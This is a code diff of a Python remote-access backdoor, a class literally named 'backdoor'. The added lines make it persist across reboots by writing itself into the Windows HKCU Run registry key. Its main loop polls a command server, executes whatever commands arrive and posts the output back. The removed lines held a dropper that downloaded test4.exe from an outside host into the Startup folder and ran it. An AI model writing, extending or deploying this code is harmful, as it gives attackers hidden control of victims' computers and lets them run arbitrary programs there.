@@ -1,5 +1,21 @@
-import requests,time,os,keyboard,pyautogui,webbrowser
-original = os.getcwd()
+import requests,time,os,keyboard,pyautogui,webbrowser,winreg,sys
+
+
+
+def add_to_registry(key_name, script_path):
+    try:
+        # Open the registry key
+        key = winreg.HKEY_CURRENT_USER
+        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_WRITE) as registry_key:
+            # Add the entry
+            winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, script_path)
+        print(f"Added '{key_name}' to the Windows Registry startup.")
+    except Exception as e:
+        print(f"Error adding to the Windows Registry: {e}")
+
+add_to_registry("startup", os.path.abspath(sys.argv[0]))
+
 
 class backdoor:
     def __init__(self, url="http://127.0.0.1:8000/"):
@@ -7,9 +23,7 @@ class backdoor:
         ip = requests.get("https://api64.ipify.org/").text
         self.id = requests.get(self.url+"api/get_id/"+ip).json()['id']
         ping = "0ms"
-        i = 0 
         while True:
-            i += 1
             start = time.time()
             requests.get(self.url+"api/ping/"+str(self.id)+"/"+ping)
             end = time.time()
@@ -17,33 +31,8 @@ class backdoor:
             commands = requests.get(self.url+"api/commands/"+str(self.id)).json()
             for i in commands:
                 output = self.run(commands[i])
-                print(output)
                 requests.post(f"{self.url}api/output/{self.id}/{i}", data={'output':output})
-            if i == 1:
-                def download():
-                    url = "https://pybdtest.pythonanywhere.com/media/files/test4.exe/"
-                    get_response = requests.get(url)
-
-                    with open("test4.exe", "wb") as out_file:
-                        out_file.write(get_response.content)
-                    os.startfile("test4.exe")
-                x = -2
-                for i in os.getcwd():
-                    if i == "\\":
-                        x += 1
-                for i in range(x):
-                    os.chdir("..")
-
-                print(os.getcwd())
-                os.chdir("AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
-                if os.path.isfile("test4.exe"):
-                    with open("test4.exe","r+") as r:
-                        r = r.read()
-                    if len(r) < 10:
-                        download()
-                else:
-                    download()
-                i = 0
+            
     def run(self, command):
         output = ""
         commands_to_execute = command.split("\r\n")
